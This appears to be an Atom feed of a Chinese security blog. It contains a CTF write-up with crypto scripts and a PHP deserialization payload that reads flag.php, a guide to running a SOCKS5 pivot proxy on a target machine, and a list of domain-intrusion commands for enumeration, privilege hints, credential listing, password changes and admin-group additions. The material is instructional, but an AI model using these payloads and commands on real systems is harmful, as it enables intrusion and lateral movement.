<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robot&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-26T03:13:59.703Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Robot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛writerup</title>
    <link href="http://yoursite.com/2019/04/22/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/04/22/第十二届全国大学生信息安全竞赛/</id>
    <published>2019-04-21T17:59:24.000Z</published>
    <updated>2018-11-26T03:13:59.703Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><a id="more"></a><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件，用笔记本打开，然后摆几个post就出flag了。</p><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;87e37d95-6a48-4463-aff8-b0dbd27d3b7d&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-saleae"><a href="#0x02-saleae" class="headerlink" title="0x02 saleae"></a>0x02 saleae</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开文件，打开后发现4个channel是spi的，没用过这个软件，对着手册一顿下操作，然后根据channel改了一下参数，发现flag在解码协议里：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/1.jpg" alt="image"></p><h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03 24c"></a>0x03 24c</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用saleae logic打开，本以为是I2C协议，其实不然，解码协议中有flag信息，后来发现发现ac有重写，穷举了一下：<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/2.jpg" alt="image"></p><p>将第一段flag和第二段拼接得到flag。</p><h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-part-des"><a href="#0x04-part-des" class="headerlink" title="0x04 part_des"></a>0x04 part_des</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>google了一下，找到大佬实现的DES，与本题主体类似，套用改了一下，由于脚本过长，贴出主要代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">def run(self, key, text, action=ENCRYPT, padding=False):</span><br><span class="line">        if len(key) &lt; 8:</span><br><span class="line">            raise &quot;Key Should be 8 bytes long&quot;</span><br><span class="line">        elif len(key) &gt; 8:</span><br><span class="line">            key = key[:8] #If key size is above 8bytes, cut to be 8bytes long</span><br><span class="line"></span><br><span class="line">        self.password = key</span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line">        if padding and action==ENCRYPT:</span><br><span class="line">            self.addPadding()</span><br><span class="line">        elif len(self.text) % 8 != 0:#If not padding specified data size must be multiple of 8 bytes</span><br><span class="line">            raise &quot;Data size should be multiple of 8&quot;</span><br><span class="line"></span><br><span class="line">        self.generatekeys() #Generate all the keys</span><br><span class="line">        text_blocks = nsplit(self.text, 8) #Split the text in blocks of 8 bytes so 64 bits</span><br><span class="line">        result = list()</span><br><span class="line">        for block in text_blocks:#Loop over all the blocks of data</span><br><span class="line">            print block</span><br><span class="line">            block = string_to_bit_array(block)#Convert the block in bit array</span><br><span class="line">            block = self.permut(block,PI)#Apply the initial permutation</span><br><span class="line">            g, d = nsplit(block, 32) #g(LEFT), d(RIGHT)</span><br><span class="line">            tmp = None</span><br><span class="line">            for i in range(16): #Do the 16 rounds</span><br><span class="line">                d_e = self.expand(d, E)</span><br><span class="line">                if action == ENCRYPT:</span><br><span class="line">                    tmp = self.xor(self.keys[i], d_e)#If encrypt use Ki</span><br><span class="line">                else:</span><br><span class="line">                    tmp = self.xor(self.keys[15-i], d_e)#If decrypt start by the last key</span><br><span class="line">                tmp = self.substitute(tmp)</span><br><span class="line">                tmp = self.permut(tmp, P)</span><br><span class="line">                tmp = self.xor(g, tmp)</span><br><span class="line">                g = d</span><br><span class="line">                d = tmp</span><br><span class="line">            result += self.permut(d+g, PI_1) #Do the last permut and append the result to result</span><br><span class="line">        final_res = bit_array_to_string(result)</span><br><span class="line">        if padding and action==DECRYPT:</span><br><span class="line">            return self.removePadding(final_res) #Remove the padding if decrypt and padding is true</span><br><span class="line">        else:</span><br><span class="line">            return final_res #Return the final string of data ciphered/deciphered</span><br></pre></td></tr></table></figure><p>根据上面的思路，改成我们要的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def run(self, aRound):</span><br><span class="line">       part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       keymap = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">       tkey = []</span><br><span class="line">       for i in range(16):</span><br><span class="line">           tmp = keymap[6*i: 6+6*i]</span><br><span class="line">           tkey.append(string_to_bit_array(tmp))</span><br><span class="line">       self.keys = tkey</span><br><span class="line">       result = list()</span><br><span class="line"></span><br><span class="line">       block = string_to_bit_array(part_encode)</span><br><span class="line">       </span><br><span class="line">       d, g = nsplit(block, 32) </span><br><span class="line">       tmp = None</span><br><span class="line">       for i in range(16): </span><br><span class="line">           if i &lt; aRound:</span><br><span class="line">               continue</span><br><span class="line">           d_e = self.expand(d, E)</span><br><span class="line">           tmp = self.xor(self.keys[15-i], d_e)</span><br><span class="line">           tmp = self.substitute(tmp)</span><br><span class="line">           tmp = self.permut(tmp, P)</span><br><span class="line">           tmp = self.xor(g, tmp)</span><br><span class="line">           g = d</span><br><span class="line">           d = tmp</span><br><span class="line">       result += self.permut(d+g, PI_1)</span><br><span class="line">       final_res = bit_array_to_string(result)</span><br><span class="line">       return final_res</span><br></pre></td></tr></table></figure><p>本题其实的考点就是把没解密完的 DES 继续解密。</p><h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0ur9Ood&#125;</span><br></pre></td></tr></table></figure><h3 id="0x05-Asymmetric"><a href="#0x05-Asymmetric" class="headerlink" title="0x05 Asymmetric"></a>0x05 Asymmetric</h3><h3 id="操作过程："><a href="#操作过程：" class="headerlink" title="操作过程："></a>操作过程：</h3><p>加密的n的公匙是pr,直接贴出脚本吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2,codecs,base64</span><br><span class="line"></span><br><span class="line">e=longspan><br><span class="line">n=long(754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721)</span><br><span class="line">t=long(165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867)</span><br><span class="line">p=long(t**2)</span><br><span class="line">q=long(t**2)</span><br><span class="line"></span><br><span class="line">d=long(gmpy2.invert(e,p**2*(p-1)))#;print d</span><br><span class="line">c=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&quot;</span><br><span class="line">c=base64.b64decode(c)</span><br><span class="line">c=c.encode(&apos;hex&apos;)#;print c</span><br><span class="line">c=int(c,16)</span><br><span class="line">m=hex(pow(c,d,n))[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">if(len(m)%2==1):</span><br><span class="line">    m=&apos;0&apos;+m</span><br><span class="line">print m.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><p>解这题用到了欧拉定理，得到m的值之后解码就得到了flag。</p><h3 id="flag的值："><a href="#flag的值：" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ec33f669d2d659e2bc27dbffdfeb0f38&#125;</span><br></pre></td></tr></table></figure><h3 id="0x06-JustSoso"><a href="#0x06-JustSoso" class="headerlink" title="0x06 JustSoso"></a>0x06 JustSoso</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源代码，发现index.php?file=xxx.php及hint，用伪协议读?file=php://filter/convert.base64-encode/resource=hint.php和index.php，解码后得到源码。<br>hint.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/3.png" alt="image"></p><p>index.php:<br><img src="/2019/04/22/第十二届全国大学生信息安全竞赛/4.png" alt="image"></p><p>从源码可以看出反序列化漏洞，解析漏洞过parse_url；链条用Handle和Flag；将__wake_up的数目改大，即可绕过二次赋值；unserilize是私有函数，用%00代替<0x00>，最终payload为：</0x00></p><p>///index.php?file=hint.php&amp;payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;N;s:10:”token_flag”;R:4;}}</p><h3 id="flag的值：-1"><a href="#flag的值：-1" class="headerlink" title="flag的值："></a>flag的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa9b19d3-d437-4668-99c3-d0a8c888633f&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-签到题&quot;&gt;&lt;a href=&quot;#0x01-签到题&quot; class=&quot;headerlink&quot; title=&quot;0x01 签到题&quot;&gt;&lt;/a&gt;0x01 签到题&lt;/h3&gt;
    
    </summary>
    
    
      <category term="ctf相关" scheme="http://yoursite.com/tags/ctf%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>公网服务器搭建socks5代理</title>
    <link href="http://yoursite.com/2018/12/28/%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2018/12/28/公网服务器搭建socks5代理/</id>
    <published>2018-12-28T04:54:47.000Z</published>
    <updated>2019-04-23T16:22:15.584Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><a id="more"></a><p>文章中所用到的工具和脚本打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h2 id="0x01-windows环境下搭建socks5代理"><a href="#0x01-windows环境下搭建socks5代理" class="headerlink" title="0x01 windows环境下搭建socks5代理"></a>0x01 windows环境下搭建socks5代理</h2><h3 id="1、ew的使用"><a href="#1、ew的使用" class="headerlink" title="1、ew的使用"></a>1、ew的使用</h3><p>我这里是用ew和proxifier配合使用的，只需要把ew放到目标机上，然后执行一条命令就得了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s ssocksd -l 8006</span><br></pre></td></tr></table></figure><p><img src="/2018/12/28/公网服务器搭建socks5代理/1.png" alt="image"></p><p>8006是要使用的端口，如果被占用了可以改用别的端口</p><h3 id="2、proxifier的配置"><a href="#2、proxifier的配置" class="headerlink" title="2、proxifier的配置"></a>2、proxifier的配置</h3><p>在目标机执行完那条命令之后就回到自己的机子，打开proxifier-&gt;配置文件-&gt;代理服务器-&gt;添加一个服务器，地址填刚才那台机子的ip地址，端口就是执行那条命令输入的端口，协议选socks版本5，确定。</p><p><img src="/2018/12/28/公网服务器搭建socks5代理/2.png" alt="image"></p><p>这样就已经配置完成了，百度一下我们的ip地址</p><p><img src="/2018/12/28/公网服务器搭建socks5代理/6.png" alt="image"></p><h2 id="0x02-linux环境搭建socks5代理"><a href="#0x02-linux环境搭建socks5代理" class="headerlink" title="0x02 linux环境搭建socks5代理"></a>0x02 linux环境搭建socks5代理</h2><p>linux搭建的话就要用到一个py脚本了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># Filename s5.py</span><br><span class="line"># Python Dynamic Socks5 Proxy</span><br><span class="line"># Usage: python s5.py 1080</span><br><span class="line"># Background Run: nohup python s5.py 1080 &amp;</span><br><span class="line"> </span><br><span class="line">import socket, sys, select, SocketServer, struct, time</span><br><span class="line"> </span><br><span class="line">class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass</span><br><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                if remote.send(sock.recv(4096)) &lt;= 0: break</span><br><span class="line">            if remote in r:</span><br><span class="line">                if sock.send(remote.recv(4096)) &lt;= 0: break</span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            pass # print &apos;from &apos;, self.client_address nothing to do.</span><br><span class="line">            sock = self.connection</span><br><span class="line">            # 1. Version</span><br><span class="line">            sock.recv(262)</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;);</span><br><span class="line">            # 2. Request</span><br><span class="line">            data = self.rfile.read(4)</span><br><span class="line">            mode = ord(data[1])</span><br><span class="line">            addrtype = ord(data[3])</span><br><span class="line">            if addrtype == 1:       # IPv4</span><br><span class="line">                addr = socket.inet_ntoa(self.rfile.read(4))</span><br><span class="line">            elif addrtype == 3:     # Domain name</span><br><span class="line">                addr = self.rfile.read(ord(sock.recv(1)[0]))</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.rfile.read(2))</span><br><span class="line">            reply = &quot;\x05\x00\x00\x01&quot;</span><br><span class="line">            try:</span><br><span class="line">                if mode == 1:  # 1. Tcp connect</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    remote.connect((addr, port[0]))</span><br><span class="line">                    pass # print &apos;To&apos;, addr, port[0]  nothing do to.</span><br><span class="line">                else:</span><br><span class="line">                    reply = &quot;\x05\x07\x00\x01&quot; # Command not supported</span><br><span class="line">                local = remote.getsockname()</span><br><span class="line">                reply += socket.inet_aton(local[0]) + struct.pack(&quot;&gt;H&quot;, local[1])</span><br><span class="line">            except socket.error:</span><br><span class="line">                # Connection refused</span><br><span class="line">                reply = &apos;\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">            sock.send(reply)</span><br><span class="line">            # 3. Transfering</span><br><span class="line">            if reply[1] == &apos;\x00&apos;:  # Success</span><br><span class="line">                if mode == 1:    # 1. Tcp connect</span><br><span class="line">                    self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error:</span><br><span class="line">            pass #print &apos;error&apos; nothing to do .</span><br><span class="line">        except IndexError:</span><br><span class="line">            pass</span><br><span class="line">def main():</span><br><span class="line">    filename = sys.argv[0];</span><br><span class="line">    if len(sys.argv)&lt;2:</span><br><span class="line">        print &apos;usage: &apos; + filename + &apos; port&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    socks_port = int(sys.argv[1]);    </span><br><span class="line">    server = ThreadingTCPServer((&apos;&apos;, socks_port), Socks5Server)</span><br><span class="line">    print &apos;bind port: %d&apos; % socks_port + &apos; ok!&apos;</span><br><span class="line">    server.serve_forever()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本在打包链接里面都有，这个也是一条命令就搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python s5.py 8088</span><br></pre></td></tr></table></figure><p><img src="/2018/12/28/公网服务器搭建socks5代理/3.png" alt="image"></p><p>同样的后面8088是端口，可以修改的，执行完了之后再回到我们的proxifier里面添加服务器，配置跟前面的一样</p><p><img src="/2018/12/28/公网服务器搭建socks5代理/4.png" alt="image"></p><p>因为我这里的windows和linux是不同的机子，所以ip设置的跟前面的不一样</p><p>再来百度看一下ip地址</p><p><img src="/2018/12/28/公网服务器搭建socks5代理/5.png" alt="image"></p><p>OK，已经成功了！</p><p>所有工具打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h5 id="—-未完待续—–"><a href="#—-未完待续—–" class="headerlink" title="—-未完待续—–"></a>—-未完待续—–</h5><h6 id="（注：本教程仅供学习，切勿用于非法用途！）"><a href="#（注：本教程仅供学习，切勿用于非法用途！）" class="headerlink" title="（注：本教程仅供学习，切勿用于非法用途！）"></a>（注：本教程仅供学习，切勿用于非法用途！）</h6>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;
    
    </summary>
    
    
      <category term="代理相关" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>内网(域)渗透常用命令</title>
    <link href="http://yoursite.com/2018/12/24/%E5%86%85%E7%BD%91(%E5%9F%9F)%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/12/24/内网(域)渗透常用命令/</id>
    <published>2018-12-24T03:42:46.000Z</published>
    <updated>2018-12-24T04:26:12.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv</span><br><span class="line">一般的权限由高到低：</span><br><span class="line">TrustedInstaller</span><br><span class="line">system</span><br><span class="line">administrator</span><br><span class="line">user</span><br><span class="line">network</span><br><span class="line">可用于提权的漏洞权限：</span><br><span class="line">SeImpersonatePrivilege</span><br><span class="line">SeAssignPrimaryPrivilege</span><br><span class="line">SeTcbPrivilege</span><br><span class="line">SeBackupPrivilege</span><br><span class="line">SeRestorePrivilege</span><br><span class="line">SeCreateTokenPrivilege</span><br><span class="line">SeLoadDriverPrivilege</span><br><span class="line">SeTakeOwnershipPrivilege</span><br><span class="line">SeDebugPrivilege</span><br></pre></td></tr></table></figure><p><img src="/2018/12/24/内网(域)渗透常用命令/1.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo    # 查看系统信息</span><br><span class="line">netstat ‐ano  # tcp/udp 网络连接状态信息</span><br><span class="line">tasklist /svc # 查看进程</span><br><span class="line">hostname      #机器名</span><br><span class="line">quser         #在线用户</span><br><span class="line">ipconfig /all #有&quot;Primary Dns Suffix 就说明是域内空的 当前机</span><br><span class="line">器应该在工作组</span><br><span class="line">cmdkey /l     #获得windows系统的远程桌面连接记录</span><br></pre></td></tr></table></figure><p><img src="/2018/12/24/内网(域)渗透常用命令/2.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Net view   #查看同一域内机器列表</span><br><span class="line">net view \\ip  #查看某IP共享</span><br><span class="line">Net view \\GHQ    #查看GHQ计算机的共享资源列表。</span><br><span class="line">net view /domain  #查看内网存在多少个域</span><br><span class="line">Net view /domain:test  #查看XYZ域中的机器列表。</span><br><span class="line">net accounts /domain # 查询域用户密码过期等信息</span><br><span class="line">net config workstation # 查看当前登录域</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user         #查看本机上的用户帐号列表</span><br><span class="line">net user XXX     #查看本机用户XXX的信息</span><br><span class="line">net user /domain #显示所在域的用户名单</span><br><span class="line">net user 域用户 /domain #获取某个域用户的详细信息</span><br><span class="line">net user /domain XXX 1111 #修改域用户密码，需要域管理员权限</span><br></pre></td></tr></table></figure><p><img src="/2018/12/24/内网(域)渗透常用命令/3.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain  #获取域管理员列表</span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器(如果有多台)</span><br><span class="line">net group &quot;domain computers&quot; /domain  #查看域机器</span><br><span class="line">net group /domain  #查询域里面的工作组</span><br><span class="line">net localgroup administrators 本机管理员[通常含有域用户]</span><br><span class="line">net localgroup administrators /domain 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add 域用户添加</span><br><span class="line">到本机</span><br></pre></td></tr></table></figure><p><img src="/2018/12/24/内网(域)渗透常用命令/4.png" alt="image"></p><h2 id="net-use-命令"><a href="#net-use-命令" class="headerlink" title="net use 命令"></a>net use 命令</h2><p>简介：建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器<br>上运行命令。上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。何为<br>UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。如果要从<br>本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是copy 1.bat<br>\192.168.1.2\C$\, 反之就是下载。dir、copy、xcopy、move、type的参数都可以使用<br>UNC路径。<br>作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。<br>域用户可以连接域里面的所有机子，但是如果域用户不是这个域机子的成员，那么就没有权<br>限访问该域机子的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip 建立空连接，空账号密码连接</span><br><span class="line">net use \\ip /u:username password</span><br><span class="line">net use * /del /yes 删除全部连接</span><br></pre></td></tr></table></figure><p><img 